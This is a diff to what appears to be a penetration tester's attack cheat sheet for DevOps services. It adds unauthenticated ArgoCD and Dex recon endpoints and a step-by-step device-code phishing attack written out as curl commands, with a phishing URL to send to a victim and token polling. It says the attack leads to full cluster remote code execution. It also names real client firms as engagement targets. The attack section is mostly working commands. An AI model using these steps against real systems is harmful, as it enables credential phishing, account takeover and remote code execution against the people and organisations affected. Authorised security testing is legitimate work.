@@ -155,8 +155,37 @@ prometheus.{domain}, metrics.{domain}, prom.{domain}
 
 **Unauthenticated Endpoints:**
 - `/api/version` — Version info disclosure
+- `/api/v1/settings` — Full config (dexConfig, execEnabled, kustomizeOptions) — HIGH VALUE
+- `/healthz` — Health check
 - `/metrics` — Prometheus metrics (if not restricted)
-- OIDC/Dex endpoints may leak config
+- `/api/dex/.well-known/openid-configuration` — OIDC discovery (issuer, endpoints, grants)
+- `/api/dex/keys` — JWKS public signing keys (aids token analysis)
+- `/api/dex/device/code` — Device code generation (NO AUTH REQUIRED)
+- `/api/dex/token` — Token exchange (poll for device code authorization)
+
+**Dex Device Code Flow Attack (confirmed GoTo Financial, May 2026):**
+```bash
+# Step 1: Generate device code (no auth)
+curl -sk -X POST "https://argocd.target.com/api/dex/device/code" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "client_id=argo-cd&scope=openid+profile+email+groups+offline_access"
+# Returns: device_code, user_code, verification_uri_complete
+
+# Step 2: Phishing URL (legitimate domain, bypasses URL reputation)
+# Send to victim: https://argocd.target.com/api/dex/device?user_code=XXXX-XXXX
+
+# Step 3: Poll for token
+curl -sk -X POST "https://argocd.target.com/api/dex/token" \
+  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=<code>&client_id=argo-cd"
+# Returns authorization_pending until victim authorizes, then JWT token
+```
+**Why this is critical:** The phishing URL is on the legitimate ArgoCD domain (not attacker-controlled), making it highly convincing. Combined with `execEnabled: true`, successful phishing = full cluster RCE.
+
+**Key settings to check in /api/v1/settings:**
+- `execEnabled: true` — pod exec allowed (RCE if auth obtained)
+- `userLoginsDisabled: true` — only SSO, no local brute-force
+- `dexConfig.connectors` — reveals SSO provider (Google, LDAP, etc.)
+- `kustomizeOptions.BuildOptions: "--load-restrictor LoadRestrictionsNone"` — path traversal in manifests
 
 **RCE Vectors:**
 - CVE-2022-24348: Path traversal → read Helm values from other apps
@@ -541,9 +570,17 @@ curl -d 'script=println+"whoami".execute().text' https://jenkins.target.com/scri
 
 # Vault status check
 curl -s https://vault.target.com:8200/v1/sys/health | jq
+
+# ArgoCD unauthenticated recon (settings + version + device code)
+curl -sk https://argocd.target.com/api/version
+curl -sk https://argocd.target.com/api/v1/settings | jq '.execEnabled, .dexConfig, .kustomizeOptions'
+curl -sk https://argocd.target.com/api/dex/.well-known/openid-configuration | jq
+curl -sk https://argocd.target.com/api/dex/keys | jq '.keys[].kid'
+curl -sk -X POST https://argocd.target.com/api/dex/device/code \
+  -d "client_id=argo-cd&scope=openid+profile+email+groups+offline_access"
 ```
 
 ---
 
-*Last updated: 2026-05-21*
-*Context: Bank Jago penetration test engagement*
+*Last updated: 2026-05-24*
+*Context: Bank Jago + GoTo Financial engagements*
